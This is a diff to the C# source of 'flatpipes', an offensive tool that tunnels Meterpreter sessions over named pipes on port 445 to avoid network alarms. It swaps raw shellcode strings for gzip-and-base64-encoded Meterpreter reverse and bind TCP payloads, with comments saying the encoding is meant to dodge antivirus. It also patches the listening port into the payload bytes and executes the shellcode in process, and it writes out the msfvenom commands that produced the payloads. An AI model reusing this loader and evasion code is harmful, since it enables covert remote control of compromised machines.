@@ -1,4 +1,27 @@
-﻿using System;
+﻿/// flatpipes v0.1
+/// A TCP proxy over named pipes. Originally created for maintaining a meterpreter session over 445 for less network alarms. 
+/// https://github.com/dxflatline/flatpipes
+///
+/// Copyright (C) 2017  Dixie Flatline (dc.flatline@gmail.com)
+///
+/// This program is free software: you can redistribute it and/or modify
+/// it under the terms of the GNU General Public License as published by
+/// the Free Software Foundation, either version 3 of the License, or
+/// any later version.
+/// This program is distributed in the hope that it will be useful,
+/// but WITHOUT ANY WARRANTY; without even the implied warranty of
+/// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+/// GNU General Public License for more details.
+/// You should have received a copy of the GNU General Public License
+/// along with this program.If not, see<http://www.gnu.org/licenses/>.
+///
+/// Major Changelog:
+///   v0.1 - First release
+///
+/// Todo:
+///   For customhex decide the client input method and encoding
+
+using System;
 using System.IO;
 using System.IO.Pipes;
 using System.Net;
@@ -8,6 +31,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
+using System.IO.Compression;
 
 namespace flatpipesns
 {
@@ -104,9 +128,28 @@ namespace flatpipesns
                     if (String.Compare(extension, "revmeter") == 0 && String.Compare(smode, "sserver") == 0)
                     {
                         Console.WriteLine("[!] Extension " + extension + " starting.");
-                        String ShellCode = "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xe0\\x1d\\x2a\\x0a\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\\x63\\x00";
-                        byte[] shellcode = StringToByteArray(ShellCode);
-                        shellcodeProcessHandle = exec_shellcode(shellcode);
+                        // We pass through encoding to minimize the AV catching popular staged meterpreter strings
+                        // Shellcode formatted by msfvenom
+                        // Below is: msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=54321 -f raw 2>/dev/null | gzip | base64 -w 0
+                        String ShellCode_B64 = "H4sIADgM9VgAA/vzoomBgSGh86nhgZTuAIPuIJ7uIJHuIg3+7V5qhv/X2CTWMOkoHDzPy3j80aeg8O4ggW4vm24fwYrHHowXA7sjFRgvd3tKPLby7DbpZrwG1ABWavGg9Btz7Q/rWpXSJxHdESqMl9O6eby7I2SAqlm6GS90uqioREcnRkYF/n8QHx/VLfS6NzbD2IiBIaO82Cg+JMOnXI39/9UdExgZGDSPhARkaDZkM/y/msWaUc/AwJjBxHDFsPNZABA4AGHGK/77D/5fnZ4lEBaeMXNpSeL/q60HSrj++3GUvnmRCPRbFkMWC1CK6eaJ+P9Xm38w1Jl1m2U5ZDAIMDCEZTFkRCwJfvr/6uTgLIawYCRVtUoRGQwOIN0BGdz6/Ab/r4ZnlOb5Ak2Pi/vPo/Ky8P///4yHNY+VHj+8+8PWRUCTgv9fBQBn+JV+TQEAAA==";
+                        // Decode base64
+                        byte[] ShellCode_gzip = Convert.FromBase64String(ShellCode_B64);
+                        // Decompress
+                        byte[] ShellCode_c = Decompress(ShellCode_gzip);
+                        // "Monkey patch" the port
+                        string portHex = Convert.ToInt32(port).ToString("X").ToLower();
+                        if (portHex.Length == 4)
+                        {
+                            ShellCode_c[181] = Convert.ToByte(portHex.Substring(0, 2), 16);
+                            ShellCode_c[182] = Convert.ToByte(portHex.Substring(2, 2), 16);
+                        }
+                        else if (portHex.Length == 2)
+                        {
+                            ShellCode_c[181] = 0;
+                            ShellCode_c[182] = Convert.ToByte(portHex.Substring(0, 2), 16);
+                        }
+                        // Execute payload and get returned handle
+                        shellcodeProcessHandle = exec_shellcode(ShellCode_c);
                         //WaitForSingleObject(hThread, 0xFFFFFFFF);
                         //Console.WriteLine("[!] Extension " + extension + " 4");
                     }
@@ -118,9 +161,28 @@ namespace flatpipesns
                     else if (String.Compare(extension, "bindmeter") == 0 && String.Compare(smode, "sclient") == 0)
                     {
                         Console.WriteLine("[!] Extension " + extension + " starting.");
-                        String ShellCode = "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xe0\\x1d\\x2a\\x0a\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\\x63\\x00";
-                        byte[] shellcode = StringToByteArray(ShellCode);
-                        shellcodeProcessHandle = exec_shellcode(shellcode);
+                        // We pass through encoding to minimize the AV catching popular staged meterpreter strings
+                        // Shellcode formatted by msfvenom
+                        // Below is: msfvenom --platform windows -p windows/meterpreter/bind_tcp LHOST=127.0.0.1 LPORT=54321 -f raw 2>/dev/null | gzip | base64 -w 0
+                        String ShellCode_B64 = "H4sIAEoT9VgAA/vzoomBgSGh86nhgZTuAIPuIJ7uIJHuIg3+7V5qhv/X2CTWMOkoHDzPy3j80aeg8O4ggW4vm24fwYrHHowXA7sjFRgvd3tKPLby7DbpZrwG1ABWavGg9Btz7Q/rWpXSJxHdESqMl9O6eby7I2SAqlm6GS90uqioREcnRkYF/n8QHx/VLfS6NzbD2IiBIaO82Cg+JMOnXI39/9UdExgZGDSPhARkaDZkM/y/msUdGfDobxZjFlPGK/77D/5fnZ7BxHDFsPNZlkBYeMah2+bp/6+2HiiNCM/Y/tLi//+r4Rklb6wfAunpGaV5volAAxiyWIAqmW6eiP9/tfkHQ51ut1mWQwaDAANDWBZDRsSS4Kf/r04OzmIIC0ZWxc54WPNY6cvDAFPg4MorAQAA";
+                        // Decode base64
+                        byte[] ShellCode_gzip = Convert.FromBase64String(ShellCode_B64);
+                        // Decompress
+                        byte[] ShellCode_c = Decompress(ShellCode_gzip);
+                        // "Monkey patch" the port
+                        string portHex = Convert.ToInt32(port).ToString("X").ToLower();
+                        if (portHex.Length == 4)
+                        {
+                            ShellCode_c[192] = Convert.ToByte(portHex.Substring(0, 2), 16);
+                            ShellCode_c[193] = Convert.ToByte(portHex.Substring(2, 2), 16);
+                        }
+                        else if (portHex.Length == 2)
+                        {
+                            ShellCode_c[192] = 0;
+                            ShellCode_c[193] = Convert.ToByte(portHex.Substring(0, 2), 16);
+                        }
+                        // Execute payload and get returned handle
+                        shellcodeProcessHandle = exec_shellcode(ShellCode_c);
                         //WaitForSingleObject(hThread, 0xFFFFFFFF);
                         //Console.WriteLine("[!] Extension " + extension + " 4");
                     }
@@ -412,6 +474,19 @@ namespace flatpipesns
             return bytes;
         }
 
+        /// <summary> 
+        /// Decompress: Decompress a gzip byte[]
+        /// </summary>
+        static byte[] Decompress(byte[] data)
+        {
+            using (var compressedStream = new MemoryStream(data))
+            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
+            using (var resultStream = new MemoryStream())
+            {
+                zipStream.CopyTo(resultStream);
+                return resultStream.ToArray();
+            }
+        }
 
 
         /// <summary> 
